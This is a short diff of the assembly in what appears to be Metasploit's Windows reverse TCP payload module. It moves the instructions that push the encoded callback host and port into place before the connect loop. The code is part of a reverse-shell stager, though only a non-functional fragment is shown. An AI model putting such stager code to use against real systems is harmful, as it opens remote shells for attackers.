@@ -175,14 +175,13 @@ module Payload::Windows::ReverseTcp
         push edi               ; socket
         push #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
         call ebp               ; bind( s, &sockaddr_in, 16 );
+        push #{encoded_host}    ; host in little-endian format
+        push #{encoded_port}    ; family AF_INET and port number
+        mov esi, esp
       ^
     end
     
     asm << %Q^
-        push #{encoded_host}    ; host in little-endian format
-        push #{encoded_port}    ; family AF_INET and port number
-        mov esi, esp  
-
       try_connect:
         push 16                 ; length of the sockaddr struct
         push esi                ; pointer to the sockaddr struct
